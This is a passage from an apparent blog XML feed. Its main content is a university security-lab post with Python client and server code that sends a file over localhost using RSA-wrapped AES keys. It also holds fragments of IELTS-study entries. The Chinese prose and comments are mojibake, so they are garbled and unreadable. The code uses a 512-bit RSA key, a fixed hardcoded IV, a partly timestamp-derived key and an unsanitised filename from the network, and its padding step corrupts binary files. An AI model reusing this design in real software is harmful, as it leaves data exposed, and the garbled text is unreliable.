å‡†å¤‡çš„ä¸€ä¸ªæ²¡è€ƒåˆ°, æ¨èè¿‡ä¸€éé¢˜åº“æ€è€ƒä¸€ä¸‹æ€ä¹ˆå›ç­”å³å¯, å›ç­”æ€è·¯å¯ä»¥çœ‹ä¸€ä¸‹upä¸»Ethanè‹±æ ¼åˆ©ä»€, è¿˜æœ‰å°±æ˜¯upä¸»åˆ˜é»‘çœ¼åœˆå­, å¥¹çœŸçš„å¸¦ç»™äº†æˆ‘ä¸€äº›å¯å‘, è™½ç„¶æˆ‘ä¸´åœºæƒ³ä¸å‡ºæ¥è¿™æ ·çš„å›ç­”, ä½†å¦‚æœæŒ‰è¿™ä¸ªæ€è·¯å¤‡è€ƒæ„Ÿè§‰æ˜¯èƒ½å‡ºåˆ†çš„.é›…æ€è€ƒè¯•è€ƒçš„å°±æ˜¯ä½ èƒ½ä¸èƒ½åƒäººä¸€æ ·äº¤æµ, è€Œä¸æ˜¯ä½ èƒ½ä¸èƒ½èƒŒä¸‹æ¥, å¾ˆå¤šå¤‡è€ƒçš„å†…å®¹ä¼šè®©äººè§‰å¾—è¿™ä¸æ˜¯åœ¨æ­£å¸¸äº¤æµä¸­ä¼šè¯´å‡ºæ¥çš„, è¯´ç®€å•çš„è¯, è¯´äººè¯(å¯¹äºä¸€èˆ¬äººæ¥è¯´, æ€æƒ³é«˜æ·±, è¯­è¨€èƒ½åŠ›å¼ºçš„äººå¦è¯´).</p>]]></content>
      
      
      <categories>
          
          <category> æ‚è°ˆ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IELTS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç°ä»£å¯†ç å­¦åŸºç¡€æŠ€èƒ½</title>
      <link href="/2024/04/09/2024-4-9-%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E4%B8%8E%E9%9A%90%E7%A7%811/"/>
      <url>/2024/04/09/2024-4-9-%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E4%B8%8E%E9%9A%90%E7%A7%811/</url>
      
        <content type="html"><![CDATA[<h3 id="ç°ä»£å¯†ç å­¦åŸºç¡€æŠ€èƒ½"><a href="#ç°ä»£å¯†ç å­¦åŸºç¡€æŠ€èƒ½" class="headerlink" title="ç°ä»£å¯†ç å­¦åŸºç¡€æŠ€èƒ½"></a>ç°ä»£å¯†ç å­¦åŸºç¡€æŠ€èƒ½</h3><p>å¤§æ•°æ®å®‰å…¨ä¸éšç§è¿™é—¨è¯¾çš„lab1,è¦æ±‚å¦‚ä¸‹å›¾:</p><p><img src="https://pb01.s3.bitiful.net/164.webp" alt="avatar"></p><p>é‡‡ç”¨çš„æ–¹æ¡ˆæ˜¯RSAå’ŒAESç›¸ç»“åˆ, åˆ©ç”¨RSAæ¥åŠ å¯†ä¼ è¾“AESçš„å¯†é’¥, ç”¨AESçš„å¯†é’¥æ¥åŠ å¯†æ•°æ®. å¦‚æœä½¿ç”¨RSAåŠ å¯†æ•°æ®, è™½ç„¶å®‰å…¨æ€§ä¼šæ›´é«˜, ä½†æ•ˆç‡ä½. AESåŠ è§£å¯†æ•ˆç‡é«˜, ä½†å®‰å…¨æ€§ä¼šå·®ä¸€äº›, æ‰€ä»¥é‡‡ç”¨RSAåŠ å¯†AESçš„å¯†é’¥, ç„¶åç”¨AESåŠ å¯†æ•°æ®, è¿™æ ·æ—¢ä¿è¯äº†æ•ˆç‡ä¹Ÿä¿è¯äº†å®‰å…¨æ€§.</p><p>ä¸ºäº†ä¿è¯ç›¸åŒæ–‡ä»¶æ¯æ¬¡å‘é€çš„åŠ å¯†æ–‡ä»¶ä¸åŒ, å°†éšæœºç”Ÿæˆçš„ç§˜é’¥ä¸å½“å‰æ—¶é—´æˆ³ç»“åˆä¸ºéšæœºAESç§˜é’¥. æ³¨é‡Šå†™å¾—å¾ˆè¯¦ç»†äº†, æœ‰äº›ç»†èŠ‚çš„ä¸œè¥¿æˆ‘å°±ä¸è§£é‡Šäº†.</p><p>è¿è¡Œç»“æœå¦‚ä¸‹:<br><img src="https://pb01.s3.bitiful.net/165.png" alt="avatar"></p><p><img src="https://pb01.s3.bitiful.net/166.png" alt="avatar"></p><h4 id="æœåŠ¡ç«¯ä»£ç "><a href="#æœåŠ¡ç«¯ä»£ç " class="headerlink" title="æœåŠ¡ç«¯ä»£ç "></a>æœåŠ¡ç«¯ä»£ç </h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">iv = <span class="string">&#x27;1425374853627180&#x27;</span>  <span class="comment"># åˆå§‹å‘é‡</span></span><br><span class="line">BUFF = <span class="number">1024</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å»é™¤æœ«å°¾å¡«å……å­—ç¬¦</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unpadding</span>(<span class="params">text</span>):</span><br><span class="line">    length = <span class="built_in">len</span>(text)</span><br><span class="line">    <span class="built_in">print</span>(text[length - <span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> text[<span class="number">0</span>:length - text[length - <span class="number">1</span>]]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">socket_service</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        <span class="comment">#  è®¾ç½®socketå¯ä»¥é‡ç”¨å·²ç»‘å®šåœ°å€</span></span><br><span class="line">        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">        s.bind((<span class="string">&#x27;localhost&#x27;</span>, <span class="number">9001</span>))  <span class="comment"># ç»‘å®šç«¯å£ä¸º9001</span></span><br><span class="line">        s.listen(<span class="number">10</span>)  <span class="comment"># è®¾ç½®ç›‘å¬æ•°,æœ€å¤šå…è®¸10ä¸ªå®¢æˆ·ç«¯è¿æ¥</span></span><br><span class="line">    <span class="keyword">except</span> socket.error <span class="keyword">as</span> msg:</span><br><span class="line">        <span class="built_in">print</span>(msg)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;ç­‰å¾…è¿æ¥...&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="comment"># è°ƒç”¨accepté˜»å¡ï¼š ç­‰å¾…è¯·æ±‚å¹¶æ¥å—(ç¨‹åºä¼šåœç•™åœ¨è¿™ä¸€æ—¦æ”¶åˆ°è¿æ¥è¯·æ±‚å³å¼€å¯æ¥å—æ•°æ®çš„çº¿ç¨‹)</span></span><br><span class="line">        conn, addr = s.accept()</span><br><span class="line">        <span class="comment"># æ¥æ”¶æ•°æ®</span></span><br><span class="line">        t = threading.Thread(target=deal_data, args=(conn, addr))</span><br><span class="line">        t.start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deal_data</span>(<span class="params">conn, addr</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;æ¥æ”¶åˆ°æ¥è‡ª &#123;0&#125;çš„è¿æ¥&#x27;</span>.<span class="built_in">format</span>(addr))</span><br><span class="line">    <span class="comment"># æ”¶åˆ°è¯·æ±‚åçš„å›å¤</span></span><br><span class="line">    conn.send(<span class="string">&#x27;welcome!&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    key = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> key:</span><br><span class="line">            s1_recv_data = conn.recv(BUFF)</span><br><span class="line">            <span class="keyword">if</span> s1_recv_data.decode(<span class="string">&#x27;utf-8&#x27;</span>) == <span class="string">&#x27;changekey&#x27;</span>:</span><br><span class="line">                <span class="built_in">print</span>(time.strftime(<span class="string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>, time.localtime(time.time())) + <span class="string">&#x27; å¼€å§‹äº¤æ¢ç§˜é’¥!&#x27;</span>)</span><br><span class="line">                <span class="comment"># ä½¿ç”¨RSAäº§ç”Ÿä¸€å¯¹å…¬é’¥å’Œç§é’¥</span></span><br><span class="line">                (pubkey, privkey) = rsa.newkeys(<span class="number">512</span>, poolsize=<span class="number">8</span>)</span><br><span class="line">                <span class="built_in">print</span>(time.strftime(<span class="string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>, time.localtime(time.time())) + <span class="string">&#x27; åˆ›å»ºRSAç§˜é’¥å¯¹!&#x27;</span>)</span><br><span class="line">                <span class="comment"># å°†å…¬é’¥æ¨¡æ•°å’ŒæŒ‡æ•°å‘é€ç»™å®¢æˆ·ç«¯</span></span><br><span class="line">                modulus = pubkey.n</span><br><span class="line">                exponent = pubkey.e</span><br><span class="line">                conn.send(<span class="built_in">str</span>(modulus).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">                conn.send(<span class="built_in">str</span>(exponent).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">                <span class="built_in">print</span>(time.strftime(<span class="string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>, time.localtime(time.time())) + <span class="string">&#x27; å‘é€RSAå…¬é’¥&#x27;</span>)</span><br><span class="line">                <span class="comment"># æœåŠ¡ç«¯æ”¶åˆ°æ¶ˆæ¯</span></span><br><span class="line">                key = conn.recv(BUFF)</span><br><span class="line">                <span class="built_in">print</span>(time.strftime(<span class="string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>,</span><br><span class="line">                                    time.localtime(time.time())) + <span class="string">&#x27; æ¥æ”¶åŠ å¯†åçš„AESç§˜é’¥:&#x27;</span> + key.decode(<span class="string">&#x27;utf8&#x27;</span>,</span><br><span class="line">                                                                                                           <span class="string">&#x27;ignore&#x27;</span>))</span><br><span class="line">                <span class="comment"># æœåŠ¡ç«¯ç”¨ç§é’¥è¿›è¡Œè§£å¯†ï¼Œå¾—åˆ°AESå¯†é’¥</span></span><br><span class="line">                key = rsa.decrypt(key, privkey)</span><br><span class="line">                <span class="built_in">print</span>(time.strftime(<span class="string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>, time.localtime(time.time())) + <span class="string">&#x27; è§£å¯†AESç§˜é’¥ä¸­&#x27;</span>)</span><br><span class="line">                key = key.decode()</span><br><span class="line">                <span class="built_in">print</span>(time.strftime(<span class="string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>, time.localtime(time.time())) + <span class="string">&#x27; AESç§˜é’¥:&#x27;</span> + key)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># ç”³è¯·ç›¸åŒå¤§å°çš„ç©ºé—´å­˜æ”¾å‘é€è¿‡æ¥çš„æ–‡ä»¶åä¸æ–‡ä»¶å¤§å°ä¿¡æ¯</span></span><br><span class="line">        fileinfo_size = struct.calcsize(<span class="string">&#x27;128sl&#x27;</span>)</span><br><span class="line">        <span class="comment"># æ¥æ”¶æ–‡ä»¶åä¸æ–‡ä»¶å¤§å°ä¿¡æ¯</span></span><br><span class="line">        buf = conn.recv(fileinfo_size)</span><br><span class="line">        <span class="comment"># åˆ¤æ–­æ˜¯å¦æ¥æ”¶åˆ°æ–‡ä»¶å¤´ä¿¡æ¯</span></span><br><span class="line">        <span class="keyword">if</span> buf:</span><br><span class="line">            <span class="comment"># è·å–æ–‡ä»¶åå’Œæ–‡ä»¶å¤§å°</span></span><br><span class="line">            filename, filesize = struct.unpack(<span class="string">&#x27;128sl&#x27;</span>, buf)</span><br><span class="line">            fn = filename.strip(<span class="string">b&#x27;\00&#x27;</span>)</span><br><span class="line">            fn = fn.decode()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;æ–‡ä»¶åæ˜¯ &#123;0&#125;, æ–‡ä»¶å¤§å°æ˜¯ &#123;1&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(fn), filesize))</span><br><span class="line">            recvd_size = <span class="number">0</span>  <span class="comment"># å®šä¹‰å·²æ¥æ”¶æ–‡ä»¶çš„å¤§å°</span></span><br><span class="line">            <span class="comment"># å­˜å‚¨åœ¨è¯¥è„šæœ¬æ‰€åœ¨ç›®å½•ä¸‹é¢</span></span><br><span class="line">            fp = <span class="built_in">open</span>(<span class="string">&#x27;./&#x27;</span> + <span class="built_in">str</span>(fn), <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;å¼€å§‹æ¥æ”¶...&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> filesize % <span class="number">16</span> == <span class="number">0</span>:</span><br><span class="line">                filesize += <span class="number">16</span> - filesize % <span class="number">16</span></span><br><span class="line">            <span class="comment"># å°†åˆ†æ‰¹æ¬¡ä¼ è¾“çš„äºŒè¿›åˆ¶æµä¾æ¬¡å†™å…¥åˆ°æ–‡ä»¶</span></span><br><span class="line">            <span class="keyword">while</span> <span class="keyword">not</span> recvd_size == filesize:</span><br><span class="line">                <span class="keyword">if</span> filesize - recvd_size &gt; <span class="number">1024</span>:</span><br><span class="line">                    data = conn.recv(<span class="number">1024</span>)</span><br><span class="line">                    recvd_size += <span class="built_in">len</span>(data)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    data = conn.recv(filesize - recvd_size)</span><br><span class="line">                    recvd_size = filesize</span><br><span class="line"></span><br><span class="line">                <span class="built_in">print</span>(<span class="built_in">len</span>(data))</span><br><span class="line">                <span class="built_in">print</span>(data)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># å°†åŠ å¯†æ•°æ®è½¬æ¢ä½bytesç±»å‹æ•°æ®</span></span><br><span class="line">                cipher = AES.new(key.encode(<span class="string">&#x27;utf8&#x27;</span>), AES.MODE_CBC, iv.encode(<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">                text_decrypted = cipher.decrypt(data)</span><br><span class="line">                <span class="built_in">print</span>(<span class="built_in">len</span>(text_decrypted))</span><br><span class="line">                <span class="built_in">print</span>(text_decrypted)</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(text_decrypted) &lt; <span class="number">1024</span>:</span><br><span class="line">                    text_decrypted = unpadding(text_decrypted)</span><br><span class="line">                <span class="built_in">print</span>(text_decrypted)</span><br><span class="line">                fp.write(text_decrypted)</span><br><span class="line">            fp.close()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;ç»“æŸæ¥æ”¶...&#x27;</span>)</span><br><span class="line">        <span class="comment"># ä¼ è¾“ç»“æŸæ–­å¼€è¿æ¥</span></span><br><span class="line">        conn.close()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    socket_service()</span><br></pre></td></tr></table></figure><h4 id="å®¢æˆ·ç«¯ä»£ç "><a href="#å®¢æˆ·ç«¯ä»£ç " class="headerlink" title="å®¢æˆ·ç«¯ä»£ç "></a>å®¢æˆ·ç«¯ä»£ç </h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line"></span><br><span class="line">key0 = os.urandom(<span class="number">16</span>).<span class="built_in">hex</span>()  <span class="comment"># éšæœºç”Ÿæˆç§˜é’¥,16ä½å­—ç¬¦ä¸²</span></span><br><span class="line">iv = <span class="string">&#x27;1425374853627180&#x27;</span>  <span class="comment"># åˆå§‹å‘é‡</span></span><br><span class="line">BUFF = <span class="number">1024</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">padding</span>(<span class="params">text</span>):</span><br><span class="line">    bs = AES.block_size  <span class="comment"># 16å­—èŠ‚</span></span><br><span class="line">    length = <span class="built_in">len</span>(text)   <span class="comment"># è·å–æ˜æ–‡é•¿åº¦,å­—ç¬¦</span></span><br><span class="line">    bytes_length = <span class="built_in">len</span>(<span class="built_in">bytes</span>(text, encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    padding = length <span class="keyword">if</span> (bytes_length == length) <span class="keyword">else</span> bytes_length</span><br><span class="line">    padding_size = bs - padding % bs</span><br><span class="line">    padding_text = <span class="built_in">chr</span>(padding_size) * padding_size   <span class="comment"># æŒ‰ç…§PKCS7å¡«å……æ–¹å¼ç”Ÿæˆå¡«å……æ–‡æœ¬</span></span><br><span class="line">    <span class="keyword">return</span> text + padding_text</span><br><span class="line"></span><br><span class="line"><span class="comment"># å‡½æ•°åŠŸèƒ½ï¼šå¯¹æ˜æ–‡è¿›è¡ŒPKCS7å¡«å……</span></span><br><span class="line"><span class="comment"># å‚æ•°textï¼šéœ€è¦å¡«å……çš„æ˜æ–‡</span></span><br><span class="line"><span class="comment"># è¿”å›å€¼ï¼šå¡«å……åçš„æ˜æ–‡</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">socket_client</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># åˆ›å»ºsocket,ipv4+æµ</span></span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.connect((<span class="string">&#x27;localhost&#x27;</span>, <span class="number">9001</span>))</span><br><span class="line">    <span class="keyword">except</span> socket.error <span class="keyword">as</span> msg:</span><br><span class="line">        <span class="built_in">print</span>(msg)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(s.recv(<span class="number">1024</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># åŠ ä¸Šç»™å¯†é’¥åŠ ä¸Šæ—¶é—´æˆ³ï¼Œä¿è¯ç›¸åŒçš„æ˜æ–‡ï¼Œæ¯æ¬¡å‘é€çš„å¯†æ–‡ä¸åŒ</span></span><br><span class="line">    t = time.time()</span><br><span class="line">    t_str = <span class="built_in">str</span>(<span class="built_in">int</span>(t))</span><br><span class="line">    key = key0[<span class="number">0</span>:<span class="number">8</span>] + t_str[<span class="number">2</span>:<span class="number">10</span>]  <span class="comment"># å–key0å‰å…«ä½å’Œæ—¶é—´æˆ³ä¸­çš„åå…«ä½ç”Ÿæˆæ–°key</span></span><br><span class="line">    <span class="built_in">print</span>(time.strftime(<span class="string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>, time.localtime(time.time())) + <span class="string">&#x27; å¼€å§‹äº¤æ¢ç§˜é’¥!&#x27;</span>)</span><br><span class="line">    s.send(<span class="string">&#x27;changekey&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    modulus = <span class="built_in">int</span>(s.recv(BUFF).decode(<span class="string">&#x27;utf-8&#x27;</span>))  <span class="comment"># æ¥æ”¶å…¬é’¥æ¨¡æ•°</span></span><br><span class="line">    exponent = <span class="built_in">int</span>(s.recv(BUFF).decode(<span class="string">&#x27;utf-8&#x27;</span>))  <span class="comment"># æ¥æ”¶å…¬é’¥æŒ‡æ•°</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(time.strftime(<span class="string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>, time.localtime(time.time())) + <span class="string">&#x27; å¼€å§‹æ„å»ºRSAå…¬é’¥&#x27;</span>)</span><br><span class="line">    pubkey = rsa.PublicKey(modulus, exponent)  <span class="comment"># æ„å»ºå…¬é’¥</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(time.strftime(<span class="string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>, time.localtime(time.time())) + <span class="string">&#x27; åŠ å¯†AESç§˜é’¥&#x27;</span>)</span><br><span class="line">    crypto = rsa.encrypt(key.encode(<span class="string">&#x27;utf-8&#x27;</span>), pubkey)  <span class="comment"># ç”¨RSAå…¬é’¥å¯¹AESå¯†é’¥è¿›è¡ŒåŠ å¯†</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(time.strftime(<span class="string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>, time.localtime(time.time())) + <span class="string">&#x27; å‘é€åŠ å¯†åçš„AESç§˜é’¥:&#x27;</span> + crypto.decode(</span><br><span class="line">        <span class="string">&#x27;utf8&#x27;</span>, <span class="string">&#x27;ignore&#x27;</span>))</span><br><span class="line">    s.send(crypto)  <span class="comment"># å‘é€åŠ å¯†åçš„AESå¯†é’¥</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># éœ€è¦ä¼ è¾“çš„æ–‡ä»¶è·¯å¾„</span></span><br><span class="line">    filepath = <span class="string">&#x27;C:/XingYan/1.png&#x27;</span></span><br><span class="line">    <span class="comment"># åˆ¤æ–­æ˜¯å¦ä¸ºæ–‡ä»¶</span></span><br><span class="line">    <span class="keyword">if</span> os.path.isfile(filepath):</span><br><span class="line">        <span class="comment"># å®šä¹‰å®šä¹‰æ–‡ä»¶ä¿¡æ¯ã€‚128sè¡¨ç¤ºæ–‡ä»¶åä¸º128bytesé•¿ï¼Œlè¡¨ç¤ºä¸€ä¸ªintæˆ–longï¼Œåœ¨æ­¤ä¸ºæ–‡ä»¶å¤§å°</span></span><br><span class="line">        fileinfo_size = struct.calcsize(<span class="string">&#x27;128sl&#x27;</span>)</span><br><span class="line">        <span class="comment"># æ‰“åŒ…æ–‡ä»¶åå’Œå¤§å°</span></span><br><span class="line">        filehead = struct.pack(<span class="string">&#x27;128sl&#x27;</span>, os.path.basename(filepath).encode(<span class="string">&#x27;utf-8&#x27;</span>), os.stat(filepath).st_size)</span><br><span class="line">        s.send(filehead)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># å°†ä¼ è¾“æ–‡ä»¶ä»¥äºŒè¿›åˆ¶çš„å½¢å¼åˆ†å¤šæ¬¡ä¸Šä¼ è‡³æœåŠ¡å™¨</span></span><br><span class="line">        fp = <span class="built_in">open</span>(filepath, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">            data = fp.read(<span class="number">1024</span>)</span><br><span class="line">            <span class="built_in">print</span>(data)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;&#123;0&#125; å‘é€ç»“æŸ...&#x27;</span>.<span class="built_in">format</span>(os.path.basename(filepath)))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(data) &lt; <span class="number">1024</span>:</span><br><span class="line">                newdata = data.decode(<span class="string">&#x27;utf8&#x27;</span>, <span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="built_in">len</span>(newdata))</span><br><span class="line">                newdata = padding(newdata)</span><br><span class="line">                <span class="built_in">print</span>(<span class="built_in">len</span>(newdata))</span><br><span class="line">                data = newdata.encode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">            cipher = AES.new(key.encode(<span class="string">&#x27;utf8&#x27;</span>), AES.MODE_CBC, iv.encode(<span class="string">&#x27;utf8&#x27;</span>))  <span class="comment"># AESåŠ å¯†å¯¹è±¡</span></span><br><span class="line">            encryptedbytes = cipher.encrypt(data)</span><br><span class="line">            s.send(encryptedbytes)</span><br><span class="line">            <span class="built_in">print</span>(encryptedbytes)</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">len</span>(encryptedbytes))</span><br><span class="line">        s.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    socket_client()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> xdu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å®‰å…¨ </tag>
            
            <tag> lab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IELTSå£è¯­</title>
      <link href="/2024/04/01/2024-4-1-IELTS%E5%8F%A3%E8%AF%AD/"/>
      <url>/2024/04/01/2024-4-1-IELTS%E5%8F%A3%E8%AF%AD/</url>
      
